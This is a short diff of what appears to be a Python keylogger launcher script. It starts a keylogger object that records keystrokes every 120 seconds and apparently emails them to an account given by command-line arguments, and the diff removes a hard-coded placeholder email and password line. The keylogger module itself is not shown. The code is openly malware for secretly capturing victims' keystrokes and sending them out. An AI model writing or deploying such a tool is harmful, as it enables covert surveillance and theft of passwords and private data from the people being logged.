@@ -22,7 +22,6 @@ def get_arguments():
 try:
     args = get_arguments()
     logger = keylogger.Keylogger(120,args.email, args.pwd)
-    logger = keylogger.Keylogger(120,"myemail@gmail.com", "emailpassword")
     logger.start()
 except KeyboardInterrupt:
     print()
